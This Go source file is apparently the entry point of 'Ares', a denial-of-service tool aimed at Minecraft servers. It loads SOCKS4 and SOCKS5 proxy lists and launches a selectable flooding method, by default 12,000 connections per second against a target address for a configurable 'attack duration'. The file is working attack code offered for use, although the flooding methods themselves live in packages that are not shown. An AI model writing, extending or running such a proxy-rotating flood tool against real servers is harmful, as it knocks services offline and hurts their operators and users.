package main

import (
	"Ares/core"
	"Ares/core/methods"
	"Ares/net/proxy"
	"Ares/utils"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"time"
)

var (
	addr     = flag.String("addr", "0.0.0.0:25565", "Server address")
	protocol = flag.Int("protocol", 761, "Server Version Protocol Id")
	delay    = flag.Int("delay", 1, "Delay between each connection loop")
	perDelay = flag.Int("per", 12000, "Connections per Delay")
	method   = flag.String("method", "cps", "Method name")
	duration = flag.Int("duration", 600, "Attack duration")
	timeout  = flag.Uint("timeout", 5, "Proxy connection timeout")
)

var err error

func main() {
	flag.Parse()

	manager := core.ProxyManager{}

	err = utils.LoadFromFile(proxy.SOCKS4, time.Duration(*timeout)*time.Second, "socks4.txt", &manager)
	if err != nil {
		fmt.Println(err)

	}
	err = utils.LoadFromFile(proxy.SOCKS5, time.Duration(*timeout)*time.Second, "socks5.txt", &manager)
	if err != nil {
		fmt.Println(err)
	}

	if manager.Length() == 0 {
		os.Exit(69)
	}

	fmt.Printf("loaded %d proxies\n", manager.Length())

	conf := core.NewConfig(*addr, *protocol, &manager, *perDelay, time.Duration(*delay)*time.Second)

	methd, err := methods.GetMethod(strings.TrimSpace(strings.ToLower(*method)), conf)
	if err != nil {
		log.Fatal(err)
	}

	methd.Start()

	time.Sleep(time.Duration(*duration) * time.Second)
}
